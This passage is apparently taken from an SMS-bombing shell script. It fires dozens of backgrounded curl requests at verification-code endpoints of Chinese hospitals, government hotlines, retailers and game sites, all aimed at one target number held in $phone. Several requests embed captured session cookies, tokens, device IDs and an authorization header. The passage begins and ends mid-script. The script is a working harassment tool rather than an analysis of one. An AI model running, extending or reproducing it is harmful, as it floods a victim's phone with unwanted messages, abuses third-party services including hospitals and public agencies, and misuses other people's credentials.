echo "第47个接口运行完毕"
curl -X POST "https://ehospital-members.sq580.com/v1_0/ehospital/app/common/sendVerifyCode" \
    -H "Host: ehospital-members.sq580.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "token: " \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxaf36c6d75fa74101/70/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"phone\": \"$phone\"}" &
echo "第48个接口运行完毕"

curl -X POST "https://hospital.fjlyrmyy.com/ihp-gateway/api/cms/sendCode" \
    -H "Host: hospital.fjlyrmyy.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 450" \
    -H "Accept: application/json, text/plain, */*" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxc8153d762f458c41/6/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw '{
        "transType": "",
        "param": {
            "phone": "'"$phone"'",
            "codeType": "LOGIN",
            "miniOpenId": "o41bz5Tif8yAhus3xP5M4ypm3N0c"
        },
        "pageParam": {},
        "serviceId": "",
        "appId": "8a8a87106b72a440016b72bf44a10000",
        "deviceId": "04daccefc14033ed3d18f157a9f6d1d8",
        "signType": "MD5",
        "termType": "WX_MINI",
        "version": "1.0.0",
        "appVersion": "1.0.0",
        "termId": "1234",
        "alg": "AES",
        "sign": "rasfs2334214fasf",
        "timestamp": "1711476594145",
        "platId": "T2023041400000000001",
        "isEncrypt": 0,
        "sessionId": ""
    }' &
echo "第49个接口运行完毕"
curl -X POST "https://homedoctor.grdoc.org/api/common/captcha/send" \
    -H "Host: homedoctor.grdoc.org" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 126" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "client: windows-applet-1.0.0" \
    -H "token: 69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx931cd4767b40b972/5/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw '{
        "token": "69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4",
        "role": "user",
        "scene": 1,
        "telephone": "'"$phone"'"
    }' &
echo "第50个接口运行完毕"

curl -X POST "https://homedoctor.grdoc.org/api/common/captcha/send" \
    -H "Host: homedoctor.grdoc.org" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 126" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "client: windows-applet-1.0.0" \
    -H "token: 69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx931cd4767b40b972/5/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw '{
        "token": "69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4",
        "role": "user",
        "scene": 1,
        "telephone": "'"$phone"'"
    }' &
echo "第50个接口运行完毕"
curl -X GET "https://ai.gzquankeinfo.com:8061/api/sms/sms/valcode?phone=$phone&orgCode=10000001" &
echo "第51个接口运行完毕"
curl -X GET "https://hxxs.mrrac.com/sendCode?mobile=$phone" &
echo "第52个接口运行完毕"
curl -X GET "https://ggfw.rlsbj.cq.gov.cn/xcb/zgbtxt/zpw_hd/code?tel=$phone&uuid=" &
echo "第54个接口运行完毕"
curl -X GET "https://remote-meter.cn:8098/mt-flowJingM/applet/user/profiles/getCode?phone=$phone" &
echo "第55个接口运行完毕"
curl -X GET "https://cxdc.mybti.cn:3700/ps/api/SendVerifyCode?phoneNumber=$phone" &
echo "第56个接口运行完毕"
curl -X GET "https://szjy.yyjqrj.net:9011/api/sms/sms/valcode?phone=$phone&orgCode=" &
echo "第57个接口运行完毕"
curl -X GET "https://isus.vip/cgi.sms.send?mobile=$phone" &
echo "第58个接口运行完毕"
curl -X GET "https://wsylfw.org315.cn/htohcloud-admin/service/getSmsCode?phoneNum=$phone" &
echo "第59个接口运行完毕"
curl -X GET "https://zhaopin.baihepan.com/prod-api/captchaSms?timestamp=1711529949073&phonenumber=$phone" &
echo "第60个接口运行完毕"
curl -X POST "https://maicai.api.ddxq.mobi/user/getSms" \
    -H "Host: maicai.api.ddxq.mobi" \
    -H "Connection: keep-alive" \
    -H "ddmc-city-number: 0101" \
    -H "ddmc-ip: " \
    -H "ddmc-build-version: 4.17.3" \
    -H "ddmc-os-version: Windows 10 x64" \
    -H "ddmc-channel: applet" \
    -H "ddmc-latitude: 0" \
    -H "Cookie: DDXQSESSID=573g65h87y59y65v9v4y165dv3657y23xzdvq36g7hvy56lfxi4l83wyi5egj00g" \
    -H "ddmc-oc_t: 1714851956" \
    -H "ddmc-api-version: 11.17.0" \
    -H "ddmc-longitude: 0" \
    -H "ddmc-SDKVersion: 3.4.3" \
    -H "ddmc-time: 1714852018" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(6.0700.143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat/(6309062b) XWEB/9129" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "ddmc-device-id: osP8I0awRCC_O1WiPSvhuWwJTAD4" \
    -H "ddmc-uid: " \
    -H "xweb_xhr: 1" \
    -H "ddmc-app-client-id: 4" \
    -H "ddmc-station-id: 5500fe01916edfe0738b4e43" \
    -H "ddmc-oc: 99.99999999999999,888.88888888888888" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx1e113254eda17715/609/page-frame.html" \
    --data-raw "uid=&longitude=0&latitude=0&station_id=5500fe01916edfe0738b4e43&city_number=0101&api_version=11.17.0&app_version=4.17.3&channel=applet&app_client_id=4&s_id=573g65h87y59y65v9v4y165dv3657y23xzdvq36g7hvy56lfxi4l83wyi5egj00g&openid=osP8I0awRCC_O1WiPSvhuWwJTAD4&device_id=osP8I0awRCC_O1WiPSvhuWwJTAD4&h5_source=&time=1714852018&device_token=WHJMrwNw1k%2FG0%2Fi%2BZiR4QiSBilQrUFhr7NLVbXikVsBN4l%2BOKowg9f8FaBMv%2BtaRplcweYZ6SDl1r7HAdJk%2F7PjsEueh9QrdCW1tldyDzmauSxIJm5Txg%3D%3D1487582755342&mobile=$phone&verify_code=&type=3&area_code=86&showData=True&app_client_name=wechat&nars=6cbb1f42a9ee475803d1d4e4c1eed7a9&sesi=%257B%2522sesiT%2522%253A%2522FgyjShta664c3c02804207401279c151d7e6f1ac%2522%252C%2522sdkv%2522%253A%25222.0.0%2522%257D" &
echo "第63个接口运行完毕"

curl -X GET "https://gateway.zhiniu.com/zucenter-server/user/getSmsCode?telephone=$phone&type=1" &
echo "第64个接口运行完毕"

curl -X GET "https://s.i.bucg.com/es/sendSms?phone=$phone" &
echo "第65个接口运行完毕"

curl -X GET "https://clgl.cadc.net.cn/api/Base/GetSmsCheckcode?telno=$phone&checkdup=1&areaid=&rolecode=TJKS" &
echo "第66个接口运行完毕"

curl -X GET "https://www.pinganbinzhong.com/mpmt-user/login/validateCode?mobile=$phone&code=&checkNotFlag=1" &
echo "第67个接口运行完毕"

curl -X GET "https://zwj.ztttb.com/webApp/yn/randNumNoLogin?userMobile=$phone&validateCodeType=01" &
echo "第68个接口运行完毕"

curl -X GET "https://cd12345.pointlinkprox.com:9443/scmd/chain/sendSMSCode?custPhone=$phone&tenantId=83ad2a2955f34ec5b9d30eb590e284d6" &
echo "第69个接口运行完毕"

curl -X GET "https://www.htjdxf.com/prod-api/applet/captcha/send/2/$phone" &
echo "第70个接口运行完毕"

curl -X GET "https://dhswyt.qz-soft.com//tools/wechatmember.ashx?action=SendPhoneCode&phone=$phone" &
echo "第71个接口运行完毕"

curl -X GET "https://yjzl.xzweijiancha.cn/client/front/wxUser/token/$phone" &
echo "第72个接口运行完毕"

curl -X GET "https://bsx.baoding12345.cn/web/bduser/register?mobile=$phone" &
echo "第73个接口运行完毕"

curl -X GET "https://yf12345.yunfu.gov.cn/workorderApp/wx/auth/sendVerificationCode.json?mobile=$phone&operateType=18" &
echo "第74个接口运行完毕"

curl -X GET "https://cgj.lasa.gov.cn/eGovaPublic/mi/app/sendidentifycode?phoneNum=$phone&corName=egova&isJsonp=1&cityCode=100&terminalID=7&access_token=&token=" &
echo "第75个接口运行完毕"

curl -X GET "http://user.daojia.com/mobile/getcode?mobile=$phone" &
echo "第76个接口运行完毕"

curl -X GET "https://login1.q1.com/Validate/SendMobileLoginCode?jsoncallback=jQuery1111039587384237433687_1627172292811&Phone=$phone&Captcha=&_=1627172292814" &
echo "第77个接口运行完毕"

curl -X GET "http://www.tanwan.com/api/reg_json_2019.php?act=3&phone=$phone&callback=jQuery112003247368730630804_1643269992344&_=1643269992347" &
echo "第78个接口运行完毕"

curl -X GET "https://m.wanzhoumo.com/proxy?api_path=%2Fuser%2Fmobilelogincode&v=3.0&fields_version=3.3&mobile=$phone" &
echo "第79个接口运行完毕"

curl -X GET "https://jdapi.jd100.com/uc/v1/getSMSCode?account=$phone&sign_type=1&use_type=1" &
echo "第80个接口运行完毕"

curl -X GET "https://xwwl-api.easthope.cn/ums/captcha/driverLoginSms?captchaToken=123&mobile=$phone&imageText=mas6" &
echo "第81个接口运行完毕"

curl -X GET "https://wx.rsj.baoji.gov.cn/bjwxVeifyPhone.action?phone=$phone" &
echo "第82个接口运行完毕"

curl -X GET "https://api.jiuyeyuren.com/api/user/sendcode?phone=$phone&public_source=3&apptype=ysyc" &
echo "第83个接口运行完毕"

curl -X GET "https://shark.x.ufans.cn/bapi/sms?mobile=$phone" &
echo "第84个接口运行完毕"

curl -X GET "https://zwj.ztttb.com/webApp/yn/randNumNoLogin?userMobile=$phone&validateCodeType=01" &
echo "第85个接口运行完毕"

curl -X GET "https://yf12345.yunfu.gov.cn/workorderApp/wx/auth/sendVerificationCode.json?mobile=$phone&operateType=18" &
echo "第86个接口运行完毕"

curl -X GET "https://great.minxundianzi.com/greatweb/great/user/sendSmsCode?countryCode=86&userTel=$phone&type=1" &
echo "第87个接口运行完毕"

curl -X GET "https://gemini.minxundianzi.com/marsplan/mars/user/sendSmsCode?countryCode=86&userTel=$phone&type=1" &
echo "第88个接口运行完毕"

curl -X GET "https://bfat.minxundianzi.com/yunjibodyfat/web/sendSmsCode?countryCode=86&userTel=$phone" &
echo "第89个接口运行完毕"

curl -X GET "https://curiousmore.com/qmore/user/sms/send?is_teach_paypal=true&mobile=$phone" &
echo "第90个接口运行完毕"

curl -X GET "https://www.ruijie.com.cn/application/api/m/sms/send?phone=$phone" &
echo "第91个接口运行完毕"

curl -X GET "https://nf.video/8081/api/auth/get/phone/code?phone=$phone&cid=86" &
echo "第92个接口运行完毕"

curl -X GET "https://applet.mbadashi.com/appletapi/applet/authorizations/smscode?mobile=$phone" &
echo "第93个接口运行完毕"

curl -X GET "https://next.gacmotor.com/mall/center-current-app/login/sendMsg/$phone" &
echo "第94个接口运行完毕"

curl -X GET "https://zybackendf-prod.myquanyi.com/sendverifycode/sendverifycode?_platform_num=153635&mobile=$phone&bus_id=101&tem_id=1001" &
echo "第95个接口运行完毕"

curl -X GET "https://great.minxundianzi.com/greatweb/great/user/sendSmsCode?countryCode=86&userTel=$phone&type=1" &
echo "第96个接口运行完毕"

curl -X GET "https://aiyidaijia.kuaimazhixing.com/frontapi/oeapi/prelogin?sig=81777b886918c47d1316d2a5215c2d&appkey=61000211&from=02050060&udid=oLX9N5V-3Ml1EZVcqFr0fg1wERSE&from_type=mini&app_ver=9.6.0&ver=3.4.3&os=windows&source=5&wxAppId=wxb46d03964eecda54&current_city_id=410500&phone=$phone&business=edaijia_" &
echo "第97个接口运行完毕"

curl -X GET "https://fyxrd.168fb.cn/master_renda/public/api/Login/sendsms?phone=$phone&user_type=2" &
echo "第98个接口运行完毕"

curl -X GET "http://user.sanwan.club/push/verificationCode/send?phone=$phone&useSms=true" &
echo "第99个接口运行完毕"

curl -X GET "https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile=$phone" &
echo "第101个接口运行完毕"

curl -X GET "https://12345.scncggzy.com.cn/wx/auth/sendVerificationCode.json?mobile=$phone" &
echo "第102个接口运行完毕"

curl -X GET "https://apis.niuxuezhang.cn/v1/sms-code?phone=$phone" &
echo "第103个接口运行完毕"

curl -X GET "https://uc.17win.com/sms/v4/web/verificationCode/send?mobile=$phone&scene=bind&isVoice=N&appId=08100110010000" &
echo "第104个接口运行完毕"

curl -X GET "https://wccy-server.sxlyb.com/open/v1/login-code/$phone?phone=$phone" &
echo "第105个接口运行完毕"

curl -X GET "https://m.ehaier.com/v3/platform/sms/getSmsCode.json?mobile=$phone&type=login" &
echo "第106个接口运行完毕"

curl -X GET "https://wechat.hfmlgy.com/wechat/set/$phone/QFKJ10001" &
echo "第107个接口运行完毕"

curl -X GET "https://mapi.ekwing.com/parent/user/sendcode?scenes=login&tel=$phone&v=9.0&os=Windows" &
echo "第108个接口运行完毕"

curl -X GET "https://qxt.matefix.cn/api/wx/common/sendMsgCode?mobile=$phone" &
echo "第109个接口运行完毕"

curl -X GET "https://test.ccsc58.com/send_code?phone=$phone&action=regist" &
echo "第110个接口运行完毕"

curl -X GET "https://api.lanniao.com/workerApi/index/sendIdentifySms/$phone" &
echo "第111个接口运行完毕"

curl -X GET "https://bb.hzbeiyang.com/platform/sms/register/V2?mobile=$phone&xcxAppId=wxa663a58156eb05b2" &
echo "第112个接口运行完毕"

curl -X GET "https://m-api.rocketbird.cn/mobile/Index/sendSmsCode?v=1.3.2&phone=$phone&m_openid=o1wsW0eE8ynJnniLNeVartjr3c-s" &
echo "第113个接口运行完毕"

curl -X POST "https://api.paozhengtong.com/notarize/user/sendMessage" \
    -H "Host: api.paozhengtong.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 17" \
    -H "scene: pzt_weixin_0.0.116" \
    -H "xweb_xhr: 1" \
    -H "checkSumDTO: {\"appid\":\"20200924001\",\"nonce\":\"554360341071\",\"curtime\":\"1712223908000\",\"checksum\":\"a9ed7bdc8734b150333b59ca005d62082074365f\"}" \
    -H "appid: wx4d68f497875d7e2c" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx4d68f497875d7e2c/33/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "phone=$phone" &
echo "第114个接口运行完毕"

curl -X POST "https://api.9tax.com/newspaper/user/sendMessage" \
    -H "Host: api.9tax.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 17" \
    -H "scene: pzt_weixin_0.0.116" \
    -H "system: {\"model\":\"microsoft\",\"appName\":\"wxe1f61a425eaae0b8\",\"system\":\"Windows 10 x64\"}" \
    -H "xweb_xhr: 1" \
    -H "appid: wx86f84c798cfb9a6b" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded;charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx86f84c798cfb9a6b/21/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "phone=$phone" &
echo "第115个接口运行完毕"
curl -X POST "https://m.midea.cn/next/user_assist/getmobilevc" \
    -H "Host: m.midea.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 38" \
    -H "X-Wx-Version: 3.9.6/3.4.1" \
    -H "xweb_xhr: 1" \
    -H "X-Wx-Appid: wxa13e96304985b75d" \
    -H "Cookie: midea_mk=486649a8b67c920c3134dd81ed1e3aa;plt=wxsapp;appname=weapp_fx_r" \
    -H "X-Wx-Ref: pages/login/login" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxa13e96304985b75d/158/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "scene=terminal_shop&mobile=$phone" &
echo "第116个接口运行完毕"

curl -X POST "https://api.shengtuanyouxuan.com/mini/life/v1/captcha/getCaptcha" \
    -H "Host: api.shengtuanyouxuan.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 49" \
    -H "mini-type: miniLife" \
    -H "xweb_xhr: 1" \
    -H "mini-version: 2.4.5" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309092b)XWEB/8461" \
    -H "sign: QKwUegAfSGGrcQyas7TsB4uCP78=" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx97e0a0a3ea2f4155/11/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"phone\": \"$phone\", \"bizCode\": \"miniBindPhone\"}" &
echo "第117个接口运行完毕"

curl -X POST "https://web.tlawyer.cn/account/sendsmsregister" \
    -H "Host: web.tlawyer.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 17" \
    -H "sec-ch-ua: \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"" \
    -H "Accept: application/json, text/javascript, */*; q=0.01" \
    -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "sec-ch-ua-mobile: ?0" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309092b)XWEB/8461" \
    -H "sec-ch-ua-platform: \"Windows\"" \
    -H "Origin: https://web.tlawyer.cn" \
    -H "Sec-Fetch-Site: same-origin" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://web.tlawyer.cn/account/reg?ref=/app/ask/lhxy" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -H "Cookie: _app=lhxy; _user_sid=bqe43fdvv5lievv4ravjd5v0" \
    --data-raw "phone=$phone" &
echo "第118个接口运行完毕"

curl -X POST "https://wap-api.duoyou.com/index.php/member/send_verification?game_id=100206&media_id=dy_59639386&is_red_sdk=1&idfa=89238414-3824-4F4D-BC95-8DABAB134023" \
    -H "Host: wap-api.duoyou.com" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Sec-Fetch-Site: same-site" \
    -H "Accept-Language: zh-CN,zh-Hans;q=0.9" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Content-Type: application/json;charset=utf-8" \
    -H "Origin: https://wap.duoyou.com" \
    -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" \
    -H "Referer: https://wap.duoyou.com/" \
    -H "Connection: keep-alive" \
    -H "Sec-Fetch-Dest: empty" \
    --data-raw "{\"scene\": \"smsLogin\", \"mobile\": \"$phone\"}" &
echo "第121个接口运行完毕"

# Shell script for request_url122
curl -X POST "https://passport.xag.cn/home/sms_code" \
    -H "Host: passport.xag.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "mini: member" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Authorization: Basic QTFDQ0FFOUItNjcwMi0wOUY4LTVDNjUtOTM3M0ZEQkY4OTY4OjNhYzcxNjk2OGM0NzlmMmMzZTVhYjc1MjQ2OTYyMWJi" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: application/json" \
    -H "xweb_xhr: 1" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "token: " \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx43471742f3e783cb/213/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "icc=86&phone=$phone" &
echo "第122个接口运行完毕"

# Shell script for request_url123
curl -X POST "https://m-sqhlwyy.panyu.gd.cn/med/gateway/640009/ytGateway" \
    -H "Host: m-sqhlwyy.panyu.gd.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 54" \
    -H "SRType: wechat" \
    -H "yt-h5url: /packages/login_with_phone/index" \
    -H "SRKey: panyu" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "X-WX-Model: microsoft" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "xweb_xhr: 1" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "Cookie: connect.sid=s:jvqIK7Zaee0wu5JbSuZZ8sDhjMo3IR0f.b0SnJDCKgOHw2fmQVXxjPzQpLNRk%2B8HWTj3o2LX1BU0" \
    -H "version: 89.1.0" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx6b114e41079b7388/3/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "api_name=/r/10001/103@udb3&phoneNo=$phone" &
echo "第123个接口运行完毕"
# Shell script for request_url124
curl -X POST "https://fcm2-5.ocj.com.cn/api/newMedia/login/mini/login/securityCode" \
    -H "Host: fcm2-5.ocj.com.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 58" \
    -H "X-media: 03" \
    -H "X-media-channel: 6" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105" \
    -H "X-chl-code: 3" \
    -H "Content-Type: application/json" \
    -H "X-msale-platform: SP" \
    -H "X-msale-code: MM" \
    -H "X-msale-way: AMM" \
    -H "xweb_xhr: 1" \
    -H "X-source: SPG" \
    -H "X-chain-id: " \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx7e98237a4154ffc7/110/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"phone\": \"$phone\", \"purpose\": \"quick_register_context\"}" &
echo "第124个接口运行完毕"

# Shell script for request_url125
curl -X POST "https://api.cdfsunrise.com/restapi/user/sendMobileCode" \
    -H "Host: api.cdfsunrise.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 214" \
    -H "AppVersion: 1.29.6" \
    -H "MiniApp: weapp" \
    -H "mobile: " \
    -H "showLoading: [object Boolean]" \
    -H "UserSystem: WeChat" \
    -H "OsVersion: 10" \
    -H "device: " \
    -H "openid: " \
    -H "ClientNetwork: wifi" \
    -H "headers: [object Object]" \
    -H "OS: unknown" \
    -H "UnionId: " \
    -H "DeviceId: DCB544E2087CEE28-A0B923820DCC509A-253638247" \
    -H "accessToken: WyI5MjlFNUUyQ0Q4RjkxRDlCLUEwQjkyMzgyMERDQzUwOUEtMjE0NDMyNzEzIiwiOTI5RTVFMkNEOEY5MUQ5Qi1BMEI5MjM4MjBEQ0M1MDlBLTIxNDQzMjcxMyJd;0;ZXlKMGVYQmxJam9pZEdGeWIxOTNaV0Z3Y0NJc0ltMXZaR1ZzSWpvaWJXbGpjbTl6YjJaMElpd2ljM2x6ZEdWdElqb2lWMmx1Wkc5M2N5QXhNQ0I0TmpRaUxDSmhjSEJmYm1GdFpTSTZJbXhsWm05NExXOW1abWxqYVdGc0xXMXBibWx3Y205bmNtRnRJaXdpZG1WeWMybHZiaUk2SWpFdU1qa3VOaUlzSW5ObGNtbGhiRTVQSWpvaWIxOWxNMm8wYkU1cmIxaDZaVGxXWWtSeVdIRXlSMll4YVVwbmF5SXNJbUZqWTI5MWJuUkpSQ0k2SWpreU9VVTFSVEpEUkRoR09URkVPVUl0UVRCQ09USXpPREl3UkVORE5UQTVRUzB5TVRRME16STNNVE1pTENKemFXZHVJam9pWm1FeU1XVmpPV1l3WW1VMk1qQXdaakZtWVRNek5EbGhPVGt6WkRJMk9XRWlmUT09;Ym5Wc2JBbz0=;;W10=;240d8fe412d77294dfdef557cd30de9d34b6c5a95b2642656419d620503ffb53ae2d23eb8d1de7a0afb165aa181e35c6786d9ae8f2ac137f8fd7d39051e6cfc1" \
    -H "Referrer-Policy: origin" \
